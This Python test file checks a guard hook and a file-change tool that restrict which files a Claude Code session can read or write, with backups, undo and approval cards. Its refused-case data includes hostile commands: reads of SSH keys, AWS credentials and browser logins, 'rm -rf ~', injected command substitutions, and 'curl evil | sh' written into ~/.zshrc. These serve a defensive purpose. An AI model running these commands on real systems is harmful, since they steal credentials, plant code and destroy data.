"""BL-141 part 2: open read and write through filechange.py, the guard hook, and "What ask creaite changed".

Run: python3 dev/tests/test_open_write.py
Temporary vaults and a temporary home folder (HOME) only. The hook is run exactly as Claude Code runs it (the call as JSON on its
standard input); the live server is started with a stand-in `claude` that records the flags it was given.
"""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from test_dashboard import populate  # noqa: E402
from test_live_server import free_port  # noqa: E402
from test_onedrive_projects import touch  # noqa: E402
from test_tracker import Vault  # noqa: E402

M365 = "mcp__claude_ai_Microsoft_365__"
OUTSIDE = {"tools": [M365 + "outlook_email_search", M365 + "read_resource", "WebFetch", "WebSearch"],
           "folders": ["inbox", "transcripts", "documents"], "outside_vault": True}
NOTE = "projects/ABC Example Programme/notes/today.md"


class Base(unittest.TestCase):
    def setUp(self):
        self.home = Path(tempfile.mkdtemp(prefix="creaite-home-")).resolve()
        self.v = Vault()
        self.root = self.v.root.resolve()
        self.env = {**os.environ, "HOME": str(self.home)}
        touch(self.root / NOTE, "notes\n")

    def tearDown(self):
        self.v.cleanup()
        shutil.rmtree(self.home, ignore_errors=True)

    def fc(self, *args):
        return subprocess.run([sys.executable, str(self.root / "system/scripts/filechange.py"), *args], capture_output=True, text=True,
                              cwd=tempfile.gettempdir(), env=self.env)

    def py(self, code):
        src = f"import sys, json; sys.path.insert(0, {str(self.root / 'system/scripts')!r})\n{code}"
        r = subprocess.run([sys.executable, "-c", src], capture_output=True, text=True, cwd=tempfile.gettempdir(), env=self.env)
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout.strip().splitlines()[-1])

    def hook(self, tool, inp, mode="ask", run="r-test", raw=None):
        r = subprocess.run([sys.executable, str(self.root / "system/scripts/reach.py"), "hook", "--run", run, "--mode", mode],
                           input=raw if raw is not None else json.dumps({"tool_name": tool, "tool_input": inp}), capture_output=True,
                           text=True, cwd=str(self.root), env=self.env)
        return r.returncode, r.stderr

    def stage(self, name, text):
        return touch(self.root / "system/staging/drafts" / name, text)

    def approved(self, change):
        """A sensitive change made the way the live server makes it after Approve: an approval issued in its own process."""
        return self.py("import reach, filechange\n"
                       f"ch = {change!r}\n"
                       "print(json.dumps(filechange.perform(ch, reach.APPROVALS.issue(filechange.fingerprint(ch)), 'dashboard')))")

    def start_run(self, run="r-test", mode="ask"):
        self.py(f"import reach; reach.start_run({run!r}, {mode!r}, {OUTSIDE!r}); print(1)")

    def log(self):
        return [json.loads(x) for x in (self.root / "system/config/files-log.jsonl").read_text().splitlines()]


class HookTests(Base):
    def test_reads_in_reach_pass_and_the_never_list_is_refused(self):
        touch(self.home / "Documents/plan.md", "plan")
        self.assertEqual(self.hook("Read", {"file_path": str(self.home / "Documents/plan.md")})[0], 0)
        self.assertEqual(self.hook("Read", {"file_path": str(self.root / NOTE)})[0], 0)
        self.assertEqual(self.hook("Grep", {"pattern": "plan", "path": str(self.home / "Documents")})[0], 0)
        self.assertEqual(self.hook("Grep", {"pattern": "plan"})[0], 0)                               # the vault
        for tool, inp in (("Read", {"file_path": str(self.home / ".ssh/id_rsa")}), ("Glob", {"pattern": "~/.aws/*"}),
                          ("Grep", {"pattern": "key", "path": str(self.home / ".gnupg")}),
                          ("Read", {"file_path": str(self.home / "Library/Application Support/Google/Chrome/Default/Login Data")}),
                          ("Read", {"file_path": "/etc/hosts"}),
                          ("Grep", {"pattern": "BEGIN RSA", "path": str(self.home)}),             # a search would go inside ~/.ssh
                          ("Grep", {"pattern": "BEGIN RSA", "path": "~", "output_mode": "content"}), ("Glob", {"pattern": "**/*", "path": "~/Library"})):
            code, err = self.hook(tool, inp)
            self.assertEqual(code, 2, (tool, inp))
            self.assertIn("creaite refused this", err)

    def test_every_other_write_route_is_refused(self):
        for cmd in ("echo hi > 'projects/ABC Example Programme/x.md'", "tee projects/x.md", "python3 -c 'open(\"x\",\"w\").write(\"y\")'",
                    "sed -i '' s/a/b/ CLAUDE.md", "cat <<EOF > notes.md", "python3 system/scripts/propose.py preview a.json > out.txt",
                    "cd /tmp && python3 system/scripts/report.py adhoc x", "python3 system/scripts/report.py x; rm -rf ~",
                    "python3 system/scripts/report.py $(cat x)", "python3 system/scripts/report.py `id`",
                    "python system/scripts/../../evil.py", "/usr/bin/python3 system/scripts/filechange.py list",
                    "python3 system/scripts/permissions.py apply 'Bash'", "python3 system/scripts/propose.py setting sweep.due_from 06:30",
                    "python3 system/scripts/docx_tools.py text ~/.ssh/id_rsa", "bash -c 'echo x'", "node x.js",
                    "python3 system/scripts/live_server.py", "python3 system/scripts/launch.py"):
            self.assertEqual(self.hook("Bash", {"command": cmd})[0], 2, cmd)
        for path in (str(self.root / NOTE), str(self.home / "Documents/x.md"), str(self.root / ".claude/settings.json"),
                     str(self.root / "system/scripts/tracker.py"), str(self.root / "inbox/x.md")):
            self.assertEqual(self.hook("Write", {"file_path": path, "content": "x"})[0], 2, path)
            self.assertEqual(self.hook("Edit", {"file_path": path, "old_string": "a", "new_string": "b"})[0], 2, path)

    def test_a_creaite_script_on_its_own_and_drafts_pass(self):
        ok = "python3 system/scripts/filechange.py edit 'projects/ABC Example Programme/notes/today.md' --from system/staging/drafts/n.md --why \"Alan's note (BL-141)\""
        self.assertEqual(self.hook("Bash", {"command": ok}), (0, ""))
        self.assertEqual(self.hook("Bash", {"command": "python3 system/scripts/tracker.py read actions --project ABC"})[0], 0)
        self.assertEqual(self.hook("Write", {"file_path": str(self.root / "system/staging/drafts/n.md"), "content": "x"})[0], 0)
        self.assertEqual(self.hook("Write", {"file_path": str(self.root / "system/staging/work.md"), "content": "x"})[0], 2)     # plain chat
        self.assertEqual(self.hook("Write", {"file_path": str(self.root / "system/staging/work.md"), "content": "x"}, mode="confirmed")[0], 0)
        self.assertEqual(self.hook("Write", {"file_path": str(self.root / "system/staging/proposed-x.json"), "content": "{}"}, mode="confirmed")[0], 2)

    def test_the_guard_fails_closed(self):
        self.assertEqual(self.hook("", {}, raw="not json")[0], 2)

    def test_the_hook_marks_the_run_before_the_tool_runs_and_the_model_cannot_clear_it(self):
        self.start_run()
        self.assertEqual(self.hook(M365 + "outlook_email_search", {"query": "from:someone"})[0], 0)
        state = json.loads((self.root / "system/guard/run.json").read_text())
        self.assertEqual(state["marked"], ["used outlook_email_search"])
        for route in (("Write", {"file_path": str(self.root / "system/guard/run.json"), "content": "{}"}),
                      ("Bash", {"command": "python3 system/scripts/filechange.py delete system/guard/run.json --why x"})):
            self.assertEqual(self.hook(*route)[0], 2 if route[0] == "Write" else 0)
        self.assertEqual(self.fc("delete", "system/guard/run.json", "--why", "x").returncode, 1)          # never: the run's mark stays
        self.assertTrue((self.root / "system/guard/run.json").exists())

    def test_reading_a_transcript_or_the_inbox_marks_the_run(self):
        touch(self.root / "projects/ABC Example Programme/transcripts/t.vtt", "WEBVTT\n")
        touch(self.root / "inbox/mail.txt", "x")
        for p, why in (("projects/ABC Example Programme/transcripts/t.vtt", "read a transcript"), ("inbox/mail.txt", "read inbox/")):
            self.start_run()
            self.hook("Read", {"file_path": str(self.root / p)})
            self.assertEqual(json.loads((self.root / "system/guard/run.json").read_text())["marked"], [why])


class WriteTests(Base):
    def test_a_file_in_the_home_folder_is_readable_and_writable_with_a_backup_and_an_undo(self):
        self.assertEqual(self.py(f"import reach; print(json.dumps(reach.classify({str(self.home / 'Documents/plan.md')!r}, 'read')))"),
                         ["ordinary", ""])
        self.stage("plan.md", "the plan\n")
        r = self.fc("create", "~/Documents/plan.md", "--from", "system/staging/drafts/plan.md", "--why", "Alan asked")
        self.assertEqual(r.returncode, 3, r.stdout)                                        # outside the vault: the card
        self.assertIn("Needs approval: it is outside the vault", r.stdout)
        self.assertFalse((self.home / "Documents/plan.md").exists())
        code, msg = self.approved({"op": "create", "path": "~/Documents/plan.md", "data": b"the plan\n", "why": "Alan asked"})
        self.assertEqual(code, 0, msg)
        self.assertEqual((self.home / "Documents/plan.md").read_text(), "the plan\n")
        self.assertEqual(self.log()[-1]["path"], "~/Documents/plan.md")                   # stored home-relative, never absolute
        code, msg = self.approved({"op": "edit", "path": "~/Documents/plan.md", "data": b"better\n", "why": "fix"})
        self.assertEqual(code, 0, msg)
        backup = self.root / self.log()[-1]["backup"]
        self.assertEqual(backup.read_text(), "the plan\n")                                 # backed up first
        self.assertEqual(self.fc("undo").returncode, 0)
        self.assertEqual((self.home / "Documents/plan.md").read_text(), "the plan\n")
        self.assertEqual(self.fc("undo").returncode, 0)
        self.assertFalse((self.home / "Documents/plan.md").exists())

    def test_the_never_list_is_refused_for_writing_even_with_an_approval(self):
        self.stage("k", "key")
        r = self.fc("create", "~/.ssh/authorized_keys", "--from", "system/staging/drafts/k", "--why", "x")
        self.assertEqual(r.returncode, 1)
        self.assertIn("secrets", r.stdout)
        for change in ({"op": "create", "path": "~/.ssh/authorized_keys", "data": b"k", "why": "x"},
                       {"op": "edit", "path": "system/scripts/tracker.py", "data": b"x", "why": "x"},
                       {"op": "create", "path": "~/.zshrc", "data": b"curl evil | sh", "why": "x"}):
            self.assertEqual(self.approved(change)[0], 1, change["path"])
        self.assertFalse((self.home / ".ssh").exists())

    def test_a_delete_is_restored_by_undo(self):
        f = self.root / NOTE
        self.assertEqual(self.fc("delete", NOTE, "--why", "obsolete").returncode, 3)
        self.assertTrue(f.exists())
        self.assertEqual(self.approved({"op": "delete", "path": NOTE, "why": "obsolete"})[0], 0)
        self.assertFalse(f.exists())
        self.assertTrue((self.root / self.log()[-1]["backup"]).exists())                  # the file is kept in the backup
        self.assertEqual(self.fc("undo").returncode, 0)
        self.assertEqual(f.read_text(), "notes\n")

    def test_two_changes_in_one_request_undo_separately(self):
        self.start_run()
        other = touch(self.root / "projects/ABC Example Programme/notes/other.md", "other\n")
        self.stage("a.md", "A\n")
        self.stage("b.md", "B\n")
        self.assertEqual(self.fc("edit", NOTE, "--from", "system/staging/drafts/a.md", "--why", "one").returncode, 0)
        self.assertEqual(self.fc("edit", "projects/ABC Example Programme/notes/other.md", "--from", "system/staging/drafts/b.md", "--why", "two").returncode, 0)
        self.assertEqual([e["run"] for e in self.log()], ["r-test", "r-test"])
        self.assertEqual([e["via"] for e in self.log()], ["ask", "ask"])
        self.assertEqual(self.fc("undo").returncode, 0)
        self.assertEqual(((self.root / NOTE).read_text(), other.read_text()), ("A\n", "other\n"))
        self.assertEqual(self.fc("undo").returncode, 0)
        self.assertEqual((self.root / NOTE).read_text(), "notes\n")

    def test_a_marked_run_asks_before_changing_anything_but_drafts_and_records_the_request(self):
        self.start_run()
        self.hook(M365 + "read_resource", {"uri": "mail://1"})
        self.stage("n.md", "changed\n")
        r = self.fc("edit", NOTE, "--from", "system/staging/drafts/n.md", "--why", "the mail said so")
        self.assertEqual(r.returncode, 3, r.stdout)
        self.assertIn("read outside content", r.stdout)
        self.assertIn("on the card for Alan", r.stdout)
        self.assertEqual((self.root / NOTE).read_text(), "notes\n")
        req = json.loads(next((self.root / "system/staging/changes").glob("r-test-*.json")).read_text())
        self.assertEqual((req["op"], req["path"], req["from"]), ("edit", NOTE, "system/staging/drafts/n.md"))
        self.assertEqual(self.fc("create", "system/staging/drafts/out.md", "--from", "system/staging/drafts/n.md").returncode, 0)

    def test_more_than_ten_changes_in_one_request_need_approval(self):
        self.start_run()
        self.stage("n.md", "x\n")
        codes = [self.fc("create", f"inbox/n{i}.md", "--from", "system/staging/drafts/n.md").returncode for i in range(11)]
        self.assertEqual(codes, [0] * 10 + [3])

    def test_each_change_and_each_refusal_is_a_line_in_the_debug_log(self):
        self.stage("n.md", "changed\n")
        self.fc("edit", NOTE, "--from", "system/staging/drafts/n.md", "--why", "x")
        self.hook("Read", {"file_path": str(self.home / ".ssh/id_rsa")})
        text = "".join(f.read_text() for f in (self.root / "system/logs").glob("debug-*.log"))
        self.assertIn(f"edit {NOTE} (change 1)", text)
        self.assertIn("refused Read", text)
        self.assertNotIn("changed", text.replace("change 1", ""))                            # never contents


FAKE = r'''#!/usr/bin/env python3
import json, sys
from pathlib import Path
args = sys.argv[1:]
here = Path(__file__).resolve().parent
def all_of(flag):
    return [args[i + 1] for i, a in enumerate(args) if a == flag]
(here / "fake_seen.json").write_text(json.dumps({"allowed": args[args.index("--allowedTools") + 1].split(","),
    "disallowed": args[args.index("--disallowedTools") + 1].split(","), "dirs": all_of("--add-dir"),
    "settings": all_of("--settings"), "prompt": args[args.index("--append-system-prompt") + 1]}))
print(json.dumps({"type": "system", "subtype": "init", "session_id": "s-1"}), flush=True)
print(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "Done."}]}}), flush=True)
print(json.dumps({"type": "result", "session_id": "s-1", "result": "Done."}), flush=True)
'''


class ServerTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.home = Path(tempfile.mkdtemp(prefix="creaite-home-")).resolve()
        cls.v = v = Vault()
        populate(v)
        fake = v.root / "fake_claude.py"
        fake.write_text(FAKE)
        fake.chmod(0o755)
        port = free_port()
        cls.base = f"http://127.0.0.1:{port}"
        cls.proc = subprocess.Popen([sys.executable, str(v.root / "system/scripts/live_server.py")],
                                    env={**os.environ, "HOME": str(cls.home), "CREAITE_PORT": str(port), "CREAITE_CLAUDE": str(fake)},
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(50):
            try:
                urllib.request.urlopen(cls.base + "/health", timeout=1)
                break
            except OSError:
                time.sleep(0.1)
        html = urllib.request.urlopen(cls.base + "/").read().decode()
        cls.token = json.loads(re.search(r'id="data">(.*?)</script>', html, re.S).group(1).replace("<\\/", "</"))["token"]

    @classmethod
    def tearDownClass(cls):
        cls.proc.terminate()
        cls.proc.wait(timeout=10)
        cls.v.cleanup()
        shutil.rmtree(cls.home, ignore_errors=True)

    def post(self, path, body):
        req = urllib.request.Request(self.base + path, data=json.dumps(body).encode(), method="POST",
                                     headers={"Content-Type": "application/json", "X-Creaite-Token": self.token})
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.read()

    def ask(self, message, **extra):
        (self.v.root / "fake_seen.json").unlink(missing_ok=True)
        self.post("/api/ask", {"message": message, **extra})
        return json.loads((self.v.root / "fake_seen.json").read_text())

    def test_a_chat_reads_the_reach_and_has_no_broad_write_or_bash(self):
        for seen in (self.ask("tidy my notes"), self.ask("echo", confirmed="Do it")):
            self.assertIn(str(self.home), seen["dirs"])                                  # the home folder is readable
            self.assertEqual(len(seen["settings"]), 1)
            hook = json.loads(seen["settings"][0])["hooks"]["PreToolUse"][0]
            self.assertEqual(hook["matcher"], "*")
            self.assertIn("reach.py' hook --run" if "'" in hook["hooks"][0]["command"] else "reach.py hook --run", hook["hooks"][0]["command"])
            self.assertFalse(json.loads(seen["settings"][0])["disableAllHooks"])
            for rule in seen["allowed"]:
                if rule.startswith(("Edit", "Write")):
                    self.assertTrue(re.fullmatch(r"(Edit|Write)\(system/staging/(drafts/)?\*\*\)", rule), rule)
                if rule.startswith("Bash"):
                    self.assertTrue(rule.startswith(("Bash(python3 system/scripts/", "Bash(python system/scripts/",
                                                     "Bash(system/scripts/run ")), rule)                    # BL-237: the wrapper
            self.assertIn("Bash(python3 system/scripts/filechange.py *)", seen["allowed"])
            for rule in ("Read(~/.ssh/**)", "Edit(~/.aws/**)", "Write(system/scripts/**)", "Bash(sed *)", "Bash(python3 -c*)"):
                self.assertIn(rule, seen["disallowed"])
        self.assertFalse((self.v.root / "system/guard/run.json").exists())             # the run's mark is cleared when it ends

    def test_what_ask_creaite_changed_lists_and_undoes(self):
        root = self.v.root
        touch(root / NOTE, "notes\n")
        touch(root / "system/staging/drafts/n.md", "changed\n")
        r = subprocess.run([sys.executable, str(root / "system/scripts/filechange.py"), "edit", NOTE, "--from", "system/staging/drafts/n.md",
                            "--why", "Alan asked", "--via", "ask"], capture_output=True, text=True, env={**os.environ, "HOME": str(self.home)})
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        rows = json.loads(self.post("/api/changes/list", {}))["changes"]
        self.assertEqual((rows[0]["op"], rows[0]["path"], rows[0]["why"], rows[0]["undone"]), ("edit", NOTE, "Alan asked", False))
        res = json.loads(self.post("/api/changes/undo", {"id": rows[0]["id"]}))
        self.assertTrue(res["ok"], res)
        self.assertEqual((root / NOTE).read_text(), "notes\n")
        self.assertTrue(json.loads(self.post("/api/changes/list", {}))["changes"][0]["undone"])


if __name__ == "__main__":
    unittest.main()
